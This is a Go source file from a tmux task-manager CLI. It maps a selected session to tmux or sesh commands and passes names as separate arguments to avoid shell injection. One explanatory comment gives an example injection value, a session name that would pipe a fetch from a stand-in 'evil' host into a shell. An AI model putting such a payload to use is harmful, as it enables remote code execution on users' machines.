package cli

import (
	"fmt"
	"os/exec"

	"github.com/agusarias/tmux-todo/internal/tui"
)

// The jump.
//
// internal/tui hands back a tui.Jump — a session name and whether it was
// running — and this file is the only place that turns one into a subprocess.
// The split is what keeps the popup environment-blind, and it also puts the
// whole invocation table in one readable place, which matters because the table
// is not obvious:
//
//	inside tmux, live      tmux switch-client -t <name>
//	inside tmux, not live  sesh connect -s <name>, else tmux new-session -d + switch-client
//	outside tmux, live     tmux attach -t <name>
//	outside tmux, not live tmux new-session -s <name>   (creates *and* attaches)
//
// Two things drive the shape. First, `switch-client` and `sesh connect -s` both
// need an attached client, and `tdo tui` can be run from a plain shell — so
// outside tmux the verb has to be attach, not switch. internal/cli is where that
// distinction can be known, since it holds the resolver. Second, `sesh` is an
// optional enhancement and never a dependency: it restores the session's
// directory and startup command when it knows the name, but a stale tdo scope
// key is a *dead tmux session name* that need not appear in `sesh list` at all
// (it blends live sessions, zoxide directories and config entries). So every
// sesh call has a tmux fallback behind it.
//
// **Every session name is passed as its own argv element and never interpolated
// into a shell string.** A name is user data — it can hold spaces, quotes and
// `$` — and there is no tmux format that escapes for a shell. This is the same
// class of bug the rename hook already hit for real (see runSessionRenamed):
// there it was `$0` expanding through `run-shell`, here it would be a session
// called `x'; curl evil|sh; '`. exec.Command with separate arguments spawns no
// shell, so the name is never re-parsed.

// runner executes a command and reports whether it succeeded. Injected so every
// row of the table above — including the sesh-is-absent fallback, which cannot
// be provoked on a machine that has sesh — is testable without tmux or sesh.
type runner func(name string, args ...string) error

// execRunner is the production runner. Output is discarded rather than
// forwarded: `tmux switch-client` says nothing on success, and its failures are
// reported by the exit status this returns.
func execRunner(name string, args ...string) error {
	return exec.Command(name, args...).Run()
}

// performJump switches the client to the session the popup asked for.
//
// The zero Jump means the popup exited by any route other than Enter, which is
// every route most of the time — so this is a no-op on the common path and costs
// nothing.
func performJump(j tui.Jump, insideTmux bool, run runner) error {
	if j.Session == "" {
		return nil
	}
	if run == nil {
		run = execRunner
	}

	if !insideTmux {
		if j.Live {
			return run("tmux", "attach", "-t", target(j.Session))
		}
		// new-session without -d creates *and* attaches, so this is one call
		// rather than create-then-attach.
		return run("tmux", "new-session", "-s", j.Session)
	}

	if j.Live {
		return switchClient(run, j.Session)
	}
	if err := run("sesh", "connect", "-s", j.Session); err == nil {
		return nil
	}
	// sesh is absent, or does not know this name. Create the session detached
	// and switch to it.
	//
	// A failure here is deliberately not returned: the overwhelmingly likely
	// cause is "duplicate session", i.e. the liveness label was stale and the
	// session is running after all — in which case switching to it is exactly
	// what the user asked for. Any real failure surfaces from switch-client,
	// which is the call that has to work either way.
	_ = run("tmux", "new-session", "-d", "-s", j.Session)
	return switchClient(run, j.Session)
}

// switchClient moves the attached client to a session.
func switchClient(run runner, session string) error {
	if err := run("tmux", "switch-client", "-t", target(session)); err != nil {
		return fmt.Errorf("switch to session %q: %w", session, err)
	}
	return nil
}

// target renders a session name as an exact tmux target.
//
// The "=" forces an exact name match, so jumping to "dev" cannot land on
// "dev-2" (tmux otherwise falls back to prefix and then fnmatch matching).
// Unlike scope.SessionID's target this needs no trailing ":", because
// switch-client and attach take a target-session rather than a target-pane.
//
// A name containing ":" cannot be targeted this way at all — that is the
// character tmux splits on — which is a limit of tmux, not of the escaping, and
// the same one the rename hook documents. Such a session can still be re-homed
// from the all-tasks view.
func target(session string) string { return "=" + session }
